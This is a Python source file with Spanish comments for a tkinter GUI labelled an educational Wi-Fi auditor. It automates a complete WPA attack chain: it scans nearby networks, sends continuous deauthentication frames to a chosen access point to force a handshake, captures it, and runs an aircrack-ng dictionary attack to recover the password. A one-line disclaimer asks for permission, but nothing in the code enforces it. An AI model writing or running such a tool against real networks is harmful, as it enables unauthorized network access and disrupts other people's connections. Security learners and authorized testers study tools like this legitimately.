# wifi_auditor_gui.py
#
# ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
# únicamente en redes para las que se tiene permiso explícito.

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import subprocess
import os
import sys
import threading
import queue
import time
import re
import csv

# --- Funciones de Backend (similares a la versión anterior pero adaptadas) ---

def check_root():
    """Verifica si el script se ejecuta como root y muestra un error si no."""
    if os.geteuid() != 0:
        messagebox.showerror("Error de Privilegios", 
                             "Este script requiere privilegios de superusuario (root).\n"
                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
        sys.exit(1)

def find_wireless_interface():
    """Encuentra la primera interfaz inalámbrica."""
    try:
        result = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT).decode('utf-8')
        interfaces = re.findall(r'Interface\s+(\w+)', result)
        return interfaces[0] if interfaces else None
    except Exception:
        return None

def set_monitor_mode(interface, log_queue):
    """Activa el modo monitor y reporta el progreso a la GUI."""
    log_queue.put(f"[*] Activando modo monitor en {interface}...")
    try:
        subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
        subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
        subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
        log_queue.put(f"[+] Modo monitor activado en {interface}.")
        return True
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] ERROR: No se pudo activar el modo monitor.")
        log_queue.put(f"    Asegúrate de que tu tarjeta de red es compatible.\n    Error: {e.stderr.decode()}")
        return False

def stop_monitor_mode(interface, log_queue):
    """Desactiva el modo monitor."""
    log_queue.put("[*] Desactivando modo monitor...")
    try:
        subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
        subprocess.run(['iwconfig', interface, 'mode', 'managed'], check=True, capture_output=True)
        subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
        # Es buena idea reiniciar el gestor de red
        subprocess.run(['systemctl', 'restart', 'NetworkManager'], check=False, capture_output=True)
        log_queue.put("[+] Interfaz restaurada a modo normal.")
    except Exception as e:
        log_queue.put(f"[!] Advertencia: No se pudo restaurar la interfaz automáticamente. Puede que necesites hacerlo manualmente.")

# --- Clase principal de la GUI ---

class WifiAuditorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Auditor Wi-Fi para Portafolio (Fines Educativos)")
        self.root.geometry("800x600")

        self.interface = None
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()

        # --- Creación de Widgets ---
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Iniciar el chequeo de la cola de logs
        self.process_log_queue()
        
        # Comprobaciones iniciales
        check_root()
        self.interface = find_wireless_interface()
        if not self.interface:
             self.log_message("[!] ERROR: No se encontró ninguna interfaz de red inalámbrica compatible.")
        else:
             self.log_message(f"[*] Interfaz inalámbrica encontrada: {self.interface}")


    def create_widgets(self):
        # Frame principal
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- Frame de escaneo y tabla de redes ---
        scan_frame = ttk.LabelFrame(main_frame, text="1. Escanear Redes", padding="10")
        scan_frame.pack(fill=tk.X, pady=5)

        self.scan_button = ttk.Button(scan_frame, text="Escanear Redes Wi-Fi", command=self.start_scan_thread)
        self.scan_button.pack(side=tk.LEFT, padx=5)

        # Tabla para mostrar redes
        self.tree = ttk.Treeview(main_frame, columns=("BSSID", "Channel", "Power", "ESSID"), show="headings")
        self.tree.heading("BSSID", text="BSSID")
        self.tree.heading("Channel", text="Canal")
        self.tree.heading("Power", text="Potencia")
        self.tree.heading("ESSID", text="Nombre de Red (ESSID)")
        self.tree.column("BSSID", width=150)
        self.tree.column("Channel", width=50)
        self.tree.column("Power", width=60)
        self.tree.pack(fill=tk.BOTH, expand=True, pady=5)
        self.tree.bind("<<TreeviewSelect>>", self.on_network_select)

        # --- Frame de ataque ---
        attack_frame = ttk.LabelFrame(main_frame, text="2. Configurar Ataque", padding="10")
        attack_frame.pack(fill=tk.X, pady=5)

        ttk.Label(attack_frame, text="Red Seleccionada (BSSID):").grid(row=0, column=0, sticky=tk.W)
        self.target_bssid = tk.StringVar()
        ttk.Entry(attack_frame, textvariable=self.target_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)

        ttk.Label(attack_frame, text="Canal:").grid(row=0, column=2, sticky=tk.W)
        self.target_channel = tk.StringVar()
        ttk.Entry(attack_frame, textvariable=self.target_channel, state="readonly", width=5).grid(row=0, column=3, padx=5)

        ttk.Label(attack_frame, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
        self.wordlist_path = tk.StringVar()
        ttk.Entry(attack_frame, textvariable=self.wordlist_path).grid(row=1, column=1, columnspan=3, padx=5, sticky=tk.EW)
        ttk.Button(attack_frame, text="Buscar...", command=self.browse_wordlist).grid(row=1, column=4, padx=5)

        attack_frame.columnconfigure(1, weight=1)

        # --- Frame de control y logs ---
        control_frame = ttk.Frame(main_frame, padding="10")
        control_frame.pack(fill=tk.X)

        self.start_button = ttk.Button(control_frame, text="INICIAR ATAQUE", command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=10)
        self.stop_button = ttk.Button(control_frame, text="DETENER TODO", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT)

        log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state="disabled", height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def log_message(self, message):
        """Añade un mensaje a la caja de texto de logs de forma segura."""
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.config(state="disabled")
        self.log_text.see(tk.END) # Auto-scroll

    def process_log_queue(self):
        """Procesa mensajes de la cola y actualiza la GUI."""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_message(message)
        except queue.Empty:
            pass
        self.root.after(100, self.process_log_queue)

    def start_scan_thread(self):
        """Inicia el escaneo de redes en un hilo separado para no congelar la GUI."""
        self.scan_button.config(state=tk.DISABLED)
        self.log_message("[*] Iniciando escaneo de redes durante 15 segundos...")
        scan_thread = threading.Thread(target=self.scan_networks)
        scan_thread.start()

    def scan_networks(self):
        """Ejecuta airodump-ng para escanear y luego puebla la tabla."""
        if not self.interface:
            self.log_queue.put("[!] No hay interfaz para escanear.")
            self.scan_button.config(state=tk.NORMAL)
            return

        # Limpiar la tabla anterior
        for i in self.tree.get_children():
            self.tree.delete(i)
        
        # airodump-ng puede guardar la salida en un archivo CSV, que es más fácil de parsear
        output_prefix = "scan_result"
        # Eliminar archivos de escaneo anteriores para evitar conflictos
        for f in os.listdir('.'):
            if f.startswith(output_prefix):
                os.remove(f)

        command = ['airodump-ng', '-w', output_prefix, '--output-format', 'csv', self.interface]
        try:
            proc = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(15) # Escanea durante 15 segundos
            proc.terminate()
            proc.wait()
        except FileNotFoundError:
            self.log_queue.put("[!] ERROR: 'airodump-ng' no encontrado. ¿Está instalado y en el PATH?")
            self.scan_button.config(state=tk.NORMAL)
            return

        # Parsear el archivo CSV generado
        try:
            csv_filename = f"{output_prefix}-01.csv"
            with open(csv_filename, 'r') as f:
                reader = csv.reader(f)
                # Saltar líneas hasta encontrar la sección de Access Points
                for row in reader:
                    if row and "BSSID" in row[0]:
                        break
                # Leer los datos de los APs
                for row in reader:
                    if len(row) < 14 or not row[0].strip(): # Final de la sección de APs
                        break
                    bssid = row[0].strip()
                    power = row[8].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()
                    self.tree.insert("", "end", values=(bssid, channel, power, essid))
            self.log_queue.put("[+] Escaneo completado. Selecciona una red de la lista.")
        except FileNotFoundError:
            self.log_queue.put("[!] No se generó el archivo de escaneo. Revisa los permisos o si la tarjeta está en modo monitor.")
        except Exception as e:
            self.log_queue.put(f"[!] Error al leer el resultado del escaneo: {e}")
        finally:
            self.scan_button.config(state=tk.NORMAL)


    def on_network_select(self, event):
        """Cuando el usuario selecciona una red, rellena los campos de ataque."""
        selected_item = self.tree.focus()
        if selected_item:
            item = self.tree.item(selected_item)
            bssid, channel, _, _ = item['values']
            self.target_bssid.set(bssid)
            self.target_channel.set(channel)

    def browse_wordlist(self):
        """Abre un diálogo para seleccionar el archivo de diccionario."""
        filepath = filedialog.askopenfilename(title="Selecciona un Diccionario",
                                              filetypes=(("Archivos de Texto", "*.txt"), ("Todos los archivos", "*.*")))
        if filepath:
            self.wordlist_path.set(filepath)

    def start_attack(self):
        """Valida los datos e inicia el hilo de ataque."""
        bssid = self.target_bssid.get()
        channel = self.target_channel.get()
        wordlist = self.wordlist_path.get()

        if not all([bssid, channel, wordlist]):
            messagebox.showwarning("Faltan Datos", "Debes seleccionar una red y un archivo de diccionario para continuar.")
            return

        self.stop_event.clear()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.scan_button.config(state=tk.DISABLED)

        # Iniciar el hilo de ataque
        self.attack_thread = threading.Thread(target=self.run_attack_sequence, args=(bssid, channel, wordlist))
        self.attack_thread.start()

    def stop_attack(self):
        """Señala al hilo de ataque que debe detenerse."""
        self.log_message("[!] Solicitud de detención enviada. Limpiando...")
        self.stop_event.set()
        self.stop_button.config(state=tk.DISABLED)

    def run_attack_sequence(self, bssid, channel, wordlist):
        """
        Esta es la función principal que se ejecuta en el hilo separado.
        Orquesta toda la secuencia de ataque.
        """
        # 1. Poner la interfaz en modo monitor
        if not set_monitor_mode(self.interface, self.log_queue):
            self.attack_finished()
            return
        
        capture_file = None
        airodump_proc = None
        aireplay_proc = None
        
        try:
            # 2. Iniciar la captura y la desautenticación automática
            self.log_queue.put("\n--- FASE 1: Capturando Handshake ---")
            self.log_queue.put(f"[*] Escuchando en BSSID {bssid} en el canal {channel}...")
            
            capture_prefix = "capture"
            for f in os.listdir('.'):
                if f.startswith(capture_prefix):
                    os.remove(f)

            # Comando para capturar
            airodump_cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', capture_prefix, self.interface]
            airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            # Comando para desautenticar en bucle
            self.log_queue.put("[*] Iniciando desautenticación automática para acelerar la captura...")
            aireplay_cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid, self.interface] # 0 = infinito
            aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 3. Monitorear hasta capturar el handshake o hasta que el usuario detenga
            handshake_found = False
            while not handshake_found and not self.stop_event.is_set():
                line = airodump_proc.stdout.readline()
                if not line:
                    break
                self.log_queue.put(line.strip()) # Opcional: mostrar toda la salida de airodump
                if "WPA handshake:" in line:
                    self.log_queue.put("\n[+] ¡HANDSHAKE CAPTURADO!\n")
                    handshake_found = True
                    capture_file = f"{capture_prefix}-01.cap"
                time.sleep(0.1)

        finally:
            # Detener siempre los subprocesos
            if airodump_proc: airodump_proc.terminate()
            if aireplay_proc: aireplay_proc.terminate()
            
        # 4. Iniciar el ataque de diccionario si se capturó el handshake
        if capture_file and os.path.exists(capture_file) and not self.stop_event.is_set():
            self.log_queue.put("\n--- FASE 2: Crackeando Contraseña ---")
            self.log_queue.put(f"[*] Iniciando ataque de diccionario con '{wordlist}'...")
            
            aircrack_cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, capture_file]
            try:
                result = subprocess.check_output(aircrack_cmd, text=True)
                self.log_queue.put("\n--- Resultados del Ataque ---")
                self.log_queue.put(result)
                if "KEY FOUND!" in result:
                     password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', result)
                     self.log_queue.put("==========================================")
                     self.log_queue.put(f"    ¡ÉXITO! Contraseña encontrada: {password.group(1)}")
                     self.log_queue.put("==========================================")
                else:
                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
            except subprocess.CalledProcessError as e:
                # Aircrack-ng a menudo sale con error si no encuentra la clave
                self.log_queue.put(e.output) # Muestra la salida de todas formas
                if "KEY FOUND!" not in e.output:
                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")

        elif self.stop_event.is_set():
            self.log_queue.put("[*] El ataque fue detenido por el usuario.")
        else:
            self.log_queue.put("[!] No se pudo capturar el handshake.")

        # 5. Limpieza final
        stop_monitor_mode(self.interface, self.log_queue)
        self.attack_finished()
        
    def attack_finished(self):
        """Reactiva los botones de la GUI cuando el ataque termina."""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.scan_button.config(state=tk.NORMAL)

    def on_closing(self):
        """Maneja el cierre de la ventana, asegurándose de que todo se detenga."""
        if self.attack_thread and self.attack_thread.is_alive():
            self.stop_event.set()
            self.attack_thread.join(timeout=5) # Esperar al hilo
        
        if self.interface:
            # Intento final de limpiar
            stop_monitor_mode(self.interface, self.log_queue)
            
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiAuditorGUI(root)
    root.mainloop()